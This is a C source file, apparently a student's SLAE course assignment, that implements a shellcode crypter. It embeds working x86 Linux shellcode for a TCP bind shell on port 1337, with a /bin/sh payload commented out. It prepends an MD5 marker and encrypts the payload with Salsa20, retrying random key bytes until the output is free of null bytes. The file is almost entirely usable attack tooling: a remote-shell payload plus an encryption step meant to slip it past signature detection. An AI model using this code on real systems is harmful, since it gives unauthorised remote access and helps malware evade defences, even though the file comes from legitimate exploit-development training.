/*
; Filename: encrypt.c
; Author:   Stylianos Voukatas
; Website:  https://vostdev.wordpress.com/
;
; Purpose:  Assignment 7 for SLAE
; SLAE:     http://securitytube-training.com/onlinecourses/securitytube-linux-assembly-expert/

; Student ID: PA-27669
*/

#include <stdio.h>
#include <gcrypt.h>
#include <time.h>
#include <unistd.h>

#define MD5_DIGEST_LENGTH 16
#define true 1
#define false 0

// /bin/sh
//uint8_t shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// tcp bind shell on port 1337
uint8_t shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x52\x52\x52\x66\x68\x05\x39\x66\x6a\x02\x89\xe1\xb2\x10\x89\xf3\x31\xc0\x66\xb8\x69\x01\xcd\x80\x31\xc0\x89\xf3\x31\xc9\x66\xb8\x6b\x01\xcd\x80\x31\xc0\x89\xf3\x31\xc9\x89\xca\x89\xc6\x66\xb8\x6c\x01\xcd\x80\x31\xdb\x89\xc3\x31\xc0\xb0\x3f\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x55\x89\xe1\xb0\x0b\xcd\x80";

// A pool to select a random character, be careful for characters that might generate null... like 'H' or 5, you should exclude them
// Bad characters for this shellcode with this key and iv and if we use only one char of the key [H,5,e]
static const char pool[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "!@#$%^&*()_+=-";

// declarations
static void encrypter(size_t len, uint8_t* buffer, uint8_t* md5_shellcode, char* key, char* nonce);
static void printBytes(uint8_t* arr, size_t len);
static int is_null_free(uint8_t* buffer, size_t len);

int main(int argc, char* argv[])
{	

	// change this to whatever you want
	char key[] = "This is a very long weak key #RR"; //32 bytes
	char nonce[] = "InitVctr"; //8 bytes

	size_t len = strlen(shellcode) + MD5_DIGEST_LENGTH;
	uint8_t *buffer = malloc(len);
	// Contains both md5 and shellcode bytes
	uint8_t *md5_shellcode = malloc(len);
	// Contains only md5 bytes
	unsigned char result[MD5_DIGEST_LENGTH];


	//rng seed
	srand( (unsigned) time(NULL) * getpid());

	// Initialize and generate MD5
    gcry_md_get_algo_dlen (GCRY_MD_MD5);
    gcry_md_hash_buffer(GCRY_MD_MD5, result, shellcode, strlen(shellcode));


	// Create the final byte sequence to encrypt 
	// Note: We can use half or even 1/4 of the produced md5 since 
	// this will be our marker that signals that we successfuly decrypted the shellcode
 	memcpy(md5_shellcode, result, MD5_DIGEST_LENGTH);
 	memcpy(md5_shellcode + MD5_DIGEST_LENGTH,shellcode, strlen(shellcode));
	
	// Print the MD5 bytes
	printf("\nMD5:\n");	
	printBytes(result, MD5_DIGEST_LENGTH);
	
	// Print MD5 + shellcode before encryption
	printf("\nMD5 + shellcode:\n");
	printBytes(md5_shellcode, len);

   	// encrypt and check for nulls
   	do
   	{
   		//select a random value from the pool
   		key[30] = pool[rand() % (sizeof(pool) - 1)];
		key[31] = pool[rand() % (sizeof(pool) - 1)];
   		
   		encrypter(len, buffer, md5_shellcode, key, nonce);	

   	}while(!is_null_free(buffer, len));

   	printf("\nKEY: %s\n", key);

	// Print encrypted shellcode	
	printf("\nEncrypted [MD5 + shellcode]:\n");
	printBytes(buffer, len);
	printf("\n");

	free(buffer);
	free(md5_shellcode);

	return 0;
}

// check for nulls
static int is_null_free(uint8_t* buffer, size_t len)
{
	for(int i=0; i<len; i++)
	{
		if(buffer[i] == 0)
		{
			printf("\n[NULL characters found! Regenerate Key]\n");
			return false;
		}
   	}

   	return true;	
}

// print the bytes
static void printBytes(uint8_t* arr, size_t len)
{
	for(int i=0; i<len; i++)
	{
		printf("\\x%02x", arr[i]);
   	}
   	printf("\n");	
}

// encrypts the md5_shellcode array with SALSA20 cipher and puts the result to buffer
static void encrypter(size_t len, uint8_t* buffer, uint8_t* md5_shellcode, char* key, char* nonce)
{
	gcry_cipher_hd_t gcryCipherHd;

	gcry_cipher_open(&gcryCipherHd, GCRY_CIPHER_SALSA20, GCRY_CIPHER_MODE_STREAM, 0); // salsa20
	gcry_cipher_setkey(gcryCipherHd, key, 32); // 32 byte key
	gcry_cipher_setiv(gcryCipherHd, nonce, 8); // 8 byte nonce 

	gcry_cipher_encrypt(gcryCipherHd, buffer, len, md5_shellcode, len);

	gcry_cipher_close(gcryCipherHd);
}